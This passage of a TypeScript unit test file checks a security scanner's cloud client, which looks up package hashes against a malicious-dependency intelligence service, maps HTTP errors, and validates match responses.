        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a MALICIOUS match when I annotate a scan then it returns the intelligence block without mutating anything', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(fetchMock, 200, matchBody());
            const result = await runScanMatchAnnotation(
                dir,
                [],
                { sessionDir: dir, env: { SENTINEL_CLOUD_URL: 'https://cloud.example.com' } }
            );
            expect(result.join('\n')).toContain('Known malicious dependency');
            expect(result.join('\n')).toContain('Local artifact: MATCHED');
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a Cloud network failure when I annotate a scan then it returns an empty annotation (fail-open, scan result untouched)', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockCloud(fetchMock, [{ match: /api\/intelligence\/match$/, status: 502, body: {} }]);
            const result = await runScanMatchAnnotation(
                dir,
                [],
                { sessionDir: dir, env: { SENTINEL_CLOUD_URL: 'https://cloud.example.com' } }
            );
            expect(result).toEqual([]);
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });
});

describe('cloud_client fetchMatch', () => {
    let fetchMock: ReturnType<typeof vi.fn>;

    beforeEach(() => {
        fetchMock = vi.fn();
        vi.stubGlobal('fetch', fetchMock);
    });

    afterEach(() => {
        vi.unstubAllGlobals();
    });

    const payload = {
        contentId: `sha512:${'a'.repeat(128)}`,
        identity: { ecosystem: 'npm', package: 'evil-pkg', version: '1.0.0' },
        signals: ['install_script'],
        scannerVersion: 'sentinel-cli-4.0.0',
    };

    it('parses a valid match result and POSTs to /api/intelligence/match with the Bearer token', async () => {
        mockResponse(fetchMock, 200, matchBody());
        const result = await fetchMatch(payload, 'tok-1', 'https://cloud.example.com');
        expect(result.ok).toBe(true);
        if (result.ok) {
            expect(result.data.state).toBe('MALICIOUS');
            expect(result.data.identityLevel?.packageIdentity).toBe('npm/evil-pkg@1.0.0');
        }
        const [url, init] = fetchMock.mock.calls[0];
        expect(String(url)).toBe(MATCH_URL);
        const headers = (init as { headers: Record<string, string> }).headers;
        expect(headers.Authorization).toBe('Bearer tok-1');
        expect(headers['Content-Type']).toBe('application/json');
    });

    it('maps 401 to kind auth', async () => {
        mockResponse(fetchMock, 401, { error: 'Invalid or expired API token.' });
        const result = await fetchMatch(payload, 'bad', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) {
            expect(result.kind).toBe('auth');
            expect(result.status).toBe(401);
        }
    });

    it('maps 403 to kind forbidden and surfaces the error', async () => {
        mockResponse(fetchMock, 403, { error: 'Your plan does not include content intelligence lookup.' });
        const result = await fetchMatch(payload, 'tok-1', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) {
            expect(result.kind).toBe('forbidden');
            expect(result.error).toContain('content intelligence lookup');
        }
    });

    it('maps 429 to kind quota and captures Retry-After', async () => {
        mockResponse(fetchMock, 429, { error: 'Rate limit exceeded.' }, { 'Retry-After': '60' });
        const result = await fetchMatch(payload, 'tok-1', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) {
            expect(result.kind).toBe('quota');
            expect(result.retryAfterSeconds).toBe(60);
        }
    });

    it('maps 503 to kind disabled', async () => {
        mockResponse(fetchMock, 503, { error: 'Content-intel is disabled on this server.' });
        const result = await fetchMatch(payload, 'tok-1', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) {
            expect(result.kind).toBe('disabled');
        }
    });

    it('maps 400 to kind bad_request', async () => {
        mockResponse(fetchMock, 400, { error: 'Invalid identity.' });
        const result = await fetchMatch(payload, 'tok-1', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) {
            expect(result.kind).toBe('bad_request');
            expect(result.error).toBe('Invalid identity.');
        }
    });

    it('rejects a response with an invalid state as network (integrity guard)', async () => {
        mockResponse(fetchMock, 200, matchBody({ state: 'WEIRD' }));
        const result = await fetchMatch(payload, 'tok-1', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) {
            expect(result.kind).toBe('network');
        }
    });
});

describe('cloud_client validateMatchResult', () => {
    it('accepts a fully valid match result', () => {
        expect(validateMatchResult(matchBody())).not.toBeNull();
    });

    it('rejects an invalid state', () => {
        expect(validateMatchResult(matchBody({ state: 'BANANA' }))).toBeNull();
    });

    it('rejects a malformed contentId', () => {
        expect(validateMatchResult(matchBody({ contentId: 'sha512:zz' }))).toBeNull();
    });

    it('rejects a bad signature format', () => {
        expect(validateMatchResult(matchBody({ contentIdLevel: { ...matchBody().contentIdLevel, signature: 'zz' } }))).toBeNull();
    });

    it('rejects an out-of-range confidence', () => {
        expect(validateMatchResult(matchBody({ contentIdLevel: { ...matchBody().contentIdLevel, confidence: 1.5 } }))).toBeNull();
    });

    it('rejects an invalid identityLevel', () => {
        expect(validateMatchResult(matchBody({ identityLevel: { ...matchBody().identityLevel, observations: -1 } }))).toBeNull();
    });

    it('rejects an invalid sharedEvidence', () => {
        expect(validateMatchResult(matchBody({ match: { ...matchBody().match, sharedEvidence: { ...matchBody().match.sharedEvidence, observations: 'x' } } }))).toBeNull();
    });
});
